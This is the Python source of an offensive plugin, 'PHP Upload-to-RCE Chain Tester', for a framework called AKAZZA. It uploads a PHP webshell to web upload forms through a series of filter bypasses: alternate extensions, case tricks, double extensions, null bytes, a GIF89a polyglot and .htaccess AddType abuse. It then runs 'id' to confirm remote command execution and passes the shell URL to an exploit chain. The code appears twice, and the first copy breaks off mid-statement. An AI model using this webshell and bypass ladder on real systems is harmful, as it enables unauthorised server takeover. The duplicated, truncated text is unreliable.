"""
PHP Upload-to-RCE Chain Tester — vector plugin
Made for: joyboyvoidera / AKAZZA

PHP-EXECUTION-SPECIFIC variants that generic upload testers miss:
  1. Alternate executable extensions:  .php5 .php7 .phtml .pht .phar .pgif
  2. Case bypass:                      .PhP (case-insensitive filters/filesystems)
  3. Double extension:                .php.jpg (Apache AddHandler / misconfig)
  4. Null byte (legacy PHP<5.3.4):    .php%00.jpg
  5. GIF89a polyglot:                 image header + PHP body (beats content checks)
  6. .htaccess abuse:                 upload .htaccess (AddType php .akz)
     + shell with innocent extension  (shell.akz) — executes as PHP

Each variant is uploaded AND execution-verified (?cmd=id) before
declaring success. Also reports WHICH quirk the app is vulnerable to.
"""
import re
from datetime import datetime
from urllib.parse import urljoin

PHP = "<?php system($_REQUEST['cmd']); ?>"

# ── The quirk ladder (order = most likely first) ──
PHP_QUIRKS = [
    # (label, filename, content, mime, why-it-works)
    ("plain .php",      "akz.php",       PHP,                            "application/x-php", "no filtering at all"),
    ("alt .php5",       "akz.php5",      PHP,                            "application/x-php", "AddHandler executes it; blocklists often forget it"),
    ("alt .php7",       "akz.php7",      PHP,                            "application/x-php", "same, PHP7-era handler"),
    ("alt .phtml",      "akz.phtml",     PHP,                            "application/x-php", "classic overlooked extension"),
    ("alt .pht",        "akz.pht",       PHP,                            "application/x-php", "rare, still mapped on many stacks"),
    ("alt .phar",       "akz.phar",      PHP,                            "application/octet-stream", "phar handler executes PHP content"),
    ("alt .pgif",       "akz.pgif",      "GIF89a" + PHP,                 "image/gif",         "nginx php-fpm config quirk: .pgif mapped to PHP"),
    ("case .PhP",       "akz.PhP",       PHP,                            "application/x-php", "case-insensitive filter check / Linux filename case bypass"),
    ("dbl .php.jpg",    "akz.php.jpg",   PHP,                            "image/jpeg",        "Apache AddHandler executes any name containing .php"),
    ("null .php%00.jpg","akz.php\x00.jpg", PHP,                          "image/jpeg",        "legacy PHP < 5.3.4 truncates at null byte"),
    ("poly GIF89a",     "akz.gif",       "GIF89a" + PHP,                 "image/gif",         "content checks pass (valid GIF header), extension allowed, AddHandler execs"),
]

# .htaccess abuse is a TWO-STEP quirk — handled separately below
HTACCESS_BODY = "# AKAZZA\nAddType application/x-httpd-php .akz\n"
HTACCESS_SHELL = ("akz_shell", "akz.akz", PHP, "application/octet-stream", ".htaccess maps .akz → PHP")


@register_plugin("PHP upload-to-RCE chain tester", phase="vector", priority=1,
                 cwe="CWE-434", attck="T1190",
                 desc="PHP-specific upload quirks: alt extensions, case, double-ext, "
                      "null-byte, GIF89a polyglot, .htaccess abuse")
def php_upload_rce(akazza, surface, origin):
    """CONTRACT: return (shell_url, param) or (None, None)."""
    GREEN, YELLOW, RED, RESET, BOLD = col["GREEN"], col["YELLOW"], col["RED"], col["RESET"], col["BOLD"]

    if not surface["upload_forms"]:
        print(f"{YELLOW}[php-rce]{RESET} no upload forms discovered — skipping")
        return None, None

    sess = akazza._authenticated_sess
    param = CONFIG["shell_param"]
    worked = []   # log of quirks that EXECUTE (report data)

    def _verify(url):
        out = akazza.webshell_cmd(url, param, "echo ___PHPQUIRK___; id", timeout=8)
        return ("___PHPQUIRK___" in out or "uid=" in out), out

    def _probe_landing(fname, filename_for_probe=None):
        """Try to find where the uploaded file lives."""
        probe_name = filename_for_probe or fname.replace("\x00", "")
        for base_dir in surface["interesting_dirs"]:
            for d in CONFIG["upload_dirs"]:
                cand = f"{base_dir}{d}/{probe_name}"
                # also try the URL-encoded null-byte form
                yield cand
                if "\x00" in fname:
                    yield cand.replace(".jpg", "%00.jpg")

    for action_url, field, extras in surface["upload_forms"]:
        print(f"\n{GREEN}[php-rce]{RESET} Testing upload form: {action_url}")

        # ── Phase A: single-file quirks ──
        for label, fname, content, mime, why in PHP_QUIRKS:
            print(f"  {YELLOW}[{label:<16}]{RESET} {fname!r:<18} — {why}")
            display = fname.replace("\x00", "%00")
            files = {field: (display, content.encode(), mime)}
            try:
                sess.post(action_url, files=files, data=extras,
                          timeout=CONFIG["timeout"])
            except Exception as e:
                print(f"    {RED}post error: {e}{RESET}")
                continue

            for cand in _probe_landing(fname):
                ok, out = _verify(cand)
                if ok:
                    print(f"    {GREEN}[★] EXECUTES: {cand}  (quirk: {label}){RESET}")
                    worked.append(label)
                    akazza.session_log.update({
                        "target_url": cand, "shell_parameter": param,
                        "shell_variant": f"PHP quirk: {label}",
                        "auto_uploaded": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                    if len(worked) >= 1:
                        # first confirmed quirk wins → hand to exploit chain
                        return cand, param
        # (fall through: keep scanning other forms if this one failed)

        # ── Phase B: .htaccess abuse (two-step) ──
        if not worked:
            print(f"\n  {BOLD}{YELLOW}[.htaccess abuse]{RESET} step 1: plant .htaccess (AddType .akz → PHP)")
            try:
                files = {field: (".htaccess", HTACCESS_BODY.encode(), "text/plain")}
                sess.post(action_url, files=files, data=extras, timeout=CONFIG["timeout"])
            except Exception as e:
                print(f"    {RED}post error: {e}{RESET}")

            shell_name, fname2, content2, mime2, why2 = HTACCESS_SHELL
            print(f"  {YELLOW}[.htaccess abuse]{RESET} step 2: upload {fname2} (innocent extension)")
            try:
                files = {field: (fname2, content2.encode(), mime2)}
                sess.post(action_url, files=files, data=extras, timeout=CONFIG["timeout"])
            except Exception as e:
                print(f"    {RED}post error: {e}{RESET}")

            for base_dir in surface["interesting_dirs"]:
                for d in CONFIG["upload_dirs"]:
                    cand = f"{base_dir}{d}/{fname2}"
                    # .htaccess must sit in the SAME directory as the shell
                    ht = f"{base_dir}{d}/.htaccess"
                    ok, out = _verify(cand)
                    if ok:
                        print(f"    {GREEN}[★] EXECUTES via .htaccess: {cand}{RESET}")
                        akazza.session_log.update({
                            "target_url": cand, "shell_parameter": param,
                            "shell_variant": "PHP quirk: .htaccess AddType abuse",
                            "auto_uploaded": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                        return cand, param

    # ── summary of what the app is vulnerable to (even without a shell) ──
    if worked:
        akazza.session_log["postex_findings"].append(
            f"PHP upload quirks confirmed: {worked}")
    print(f"\n{YELLOW}[php-rce]{RESET} ladder exhausted, no execution confirmed")
    return N
"""
PHP Upload-to-RCE Chain Tester — vector plugin
PHP-specific quirks: alt extensions, case bypass, double-ext, null byte,
GIF89a polyglot, .htaccess abuse. Each variant is uploaded AND
execution-verified before claiming success.
"""
from datetime import datetime

PHP = "<?php system($_REQUEST['cmd']); ?>"

PHP_QUIRKS = [
    ("plain .php",      "akz.php",       PHP,            "application/x-php",     "no filtering at all"),
    ("alt .php5",       "akz.php5",      PHP,            "application/x-php",     "AddHandler executes it"),
    ("alt .php7",       "akz.php7",      PHP,            "application/x-php",     "PHP7-era handler"),
    ("alt .phtml",      "akz.phtml",     PHP,            "application/x-php",     "classic overlooked extension"),
    ("alt .pht",        "akz.pht",       PHP,            "application/x-php",     "rare, often still mapped"),
    ("alt .phar",       "akz.phar",      PHP,            "application/octet-stream", "phar handler execs PHP content"),
    ("alt .pgif",       "akz.pgif",      "GIF89a" + PHP, "image/gif",             "nginx php-fpm .pgif quirk"),
    ("case .PhP",       "akz.PhP",       PHP,            "application/x-php",     "case-sensitive filter mismatch"),
    ("dbl .php.jpg",    "akz.php.jpg",   PHP,            "image/jpeg",            "Apache AddHandler matches mid-name"),
    ("null .php\x00.jpg","akz.php\x00.jpg", PHP,         "image/jpeg",            "legacy PHP <5.3.4 truncation"),
    ("poly GIF89a",     "akz.gif",       "GIF89a" + PHP, "image/gif",            "getimagesize passes, handler execs"),
]

HTACCESS_BODY = "AddType application/x-httpd-php .akz\n"
HTACCESS_SHELL = ("akz.akz", PHP, "application/octet-stream")


@register_plugin("PHP upload-to-RCE chain tester", phase="vector", priority=1,
                 cwe="CWE-434", attck="T1190",
                 wants=["upload_weak", "upload_form", "phpinfo", "php_disclosed",
                        "composer", "apache"],
                 avoids=["upload_strict"],
                 desc="PHP-specific upload quirks ladder")
def php_upload_rce(akazza, surface, origin):
    GREEN, YELLOW, RED, RESET, BOLD = (col["GREEN"], col["YELLOW"], col["RED"],
                                       col["RESET"], col["BOLD"])
    if not surface["upload_forms"]:
        print(f"{YELLOW}[php-rce]{RESET} no upload forms discovered — skipping")
        return None, None

    sess = akazza._authenticated_sess
    param = CONFIG["shell_param"]
    worked = []

    def _verify(url):
        out = akazza.webshell_cmd(url, param, "echo ___PHPQUIRK___; id", timeout=8)
        return ("___PHPQUIRK___" in out or "uid=" in out), out

    for action_url, field, extras in surface["upload_forms"]:
        print(f"\n{GREEN}[php-rce]{RESET} Testing upload form: {action_url}")

        # Phase A: single-file quirks
        for label, fname, content, mime, why in PHP_QUIRKS:
            print(f"  {YELLOW}[{label:<17}]{RESET} {fname!r:<20} — {why}")
            display = fname.replace("\x00", "%00")
            files = {field: (display, content.encode(), mime)}
            try:
                sess.post(action_url, files=files, data=extras,
                          timeout=CONFIG["timeout"])
            except Exception as e:
                print(f"    {RED}post error: {e}{RESET}")
                continue

            probe_name = fname.replace("\x00", "")
            for base_dir in surface["interesting_dirs"]:
                for d in CONFIG["upload_dirs"]:
                    cand = f"{base_dir}{d}/{probe_name}"
                    ok, _ = _verify(cand)
                    if ok:
                        print(f"    {GREEN}[★] EXECUTES: {cand}  (quirk: {label}){RESET}")
                        worked.append(label)
                        akazza.session_log.update({
                            "target_url": cand, "shell_parameter": param,
                            "shell_variant": f"PHP quirk: {label}",
                            "auto_uploaded": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                        return cand, param
                    if "\x00" in fname:
                        ok, _ = _verify(cand.replace(".jpg", "%00.jpg"))
                        if ok:
                            print(f"    {GREEN}[★] EXECUTES: {cand}%00 (null-byte){RESET}")
                            akazza.session_log.update({
                                "target_url": cand, "shell_parameter": param,
                                "shell_variant": f"PHP quirk: {label}",
                                "auto_uploaded": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                            return cand, param

        # Phase B: .htaccess abuse (two-step)
        if not worked:
            print(f"\n  {BOLD}{YELLOW}[.htaccess abuse]{RESET} step 1: plant .htaccess (.akz → PHP)")
            try:
                files = {field: (".htaccess", HTACCESS_BODY.encode(), "text/plain")}
                sess.post(action_url, files=files, data=extras, timeout=CONFIG["timeout"])
            except Exception as e:
                print(f"    {RED}post error: {e}{RESET}")
            fname2, content2 = HTACCESS_SHELL
            print(f"  {YELLOW}[.htaccess abuse]{RESET} step 2: upload {fname2} (innocent ext)")
            try:
                files = {field: (fname2, content2.encode(), "application/octet-stream")}
                sess.post(action_url, files=files, data=extras, timeout=CONFIG["timeout"])
            except Exception as e:
                print(f"    {RED}post error: {e}{RESET}")
            for base_dir in surface["interesting_dirs"]:
                for d in CONFIG["upload_dirs"]:
                    cand = f"{base_dir}{d}/{fname2}"
                    ok, _ = _verify(cand)
                    if ok:
                        print(f"    {GREEN}[★] EXECUTES via .htaccess: {cand}{RESET}")
                        akazza.session_log.update({
                            "target_url": cand, "shell_parameter": param,
                            "shell_variant": "PHP quirk: .htaccess AddType abuse",
                            "auto_uploaded": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                        return cand, param

    if worked:
        akazza.session_log["postex_findings"].append(f"PHP upload quirks confirmed: {worked}")
    print(f"\n{YELLOW}[php-rce]{RESET} ladder exhausted, no execution confirmed")
    return None, None

